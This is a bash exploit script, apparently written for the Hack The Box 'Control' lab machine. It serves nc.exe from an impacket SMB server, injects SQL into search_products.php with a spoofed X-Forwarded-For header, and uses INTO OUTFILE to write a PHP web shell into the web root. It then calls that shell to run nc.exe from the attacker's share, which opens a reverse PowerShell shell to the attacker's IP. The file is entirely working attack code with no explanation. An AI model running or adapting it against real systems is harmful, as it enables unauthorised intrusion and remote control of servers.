#!/bin/bash

# Change This
remote_ip="10.129.72.209"
local_ip="10.10.14.27"
port=443
uploadPath="http://$remote_ip/search_products.php"
backdoor_path="http://$remote_ip/c.php"
smbPath="/home/kali/HTB/Control/content"

ctrl_c(){
  echo -e "\n Exiting...\n"; sleep 0.5; killall python3;exit 0 
}

smbServer(){

  for file in $(ls $smbPath); do 
      if [ $file = "nc.exe" ]; then
        echo -e "\n[+] Nc.exe exists, skipping"
        break
      else echo -e "\n[!] Nc.exe doesn't exists on this folder!!!\n"; echo -e "Exiting..."; sleep 0.5; exit 1
        fi
      done

  lsof -i:445 &>/dev/null
  statusCode="$?"
  if [ $statusCode -ne 0 ]; then
    echo -e "[!] Starting SMB Server..."; sleep 0.35
    cd $smbPath; impacket-smbserver shared $(pwd) -smb2support &>/dev/null &
  else
    echo -e "\n[+] SMB Server is started, skipping...\n"
  fi


}

uploadFile(){

  getResponse=$(curl -s $backdoor_path -H "X-Forwarded-For: 192.168.4.28" -I | head -n 1 | awk '{print $2}')

  echo -e "\n[!] Checking if webshell exists...\n"; sleep 0.35

  if [ $getResponse -eq 200 ]; then

    echo -e "[+] Webshell exists, skipping..."; sleep 0.35
  else

    echo -e "[!] Uploading webshell..."; sleep 0.5

  curl -s -X POST $uploadPath -H "X-Forwarded-For: 192.168.4.28" --data-urlencode "productName=' union select 1,2,3,4,5,'<?php system(\$_GET[\"c\"]); ?>' into outfile 'C:\\\\inetpub\\\\wwwroot\\\\c.php'-- -" &>/dev/null

  fi


}

shell(){

  echo -e "[*] Attacker IP: $local_ip"
  echo -e "[*] Attacker Port: $port\n"

  echo -e "\nSending Shell.. check your listener!... (Press CTRL + C to exit program)\n"
  

  curl -s -X GET -G $backdoor_path  --data-urlencode "c=cmd /c \\\\$local_ip\\shared\\nc.exe -e powershell.exe $local_ip $port" &>/dev/null


}



trap ctrl_c SIGINT

smbServer
uploadFile
shell




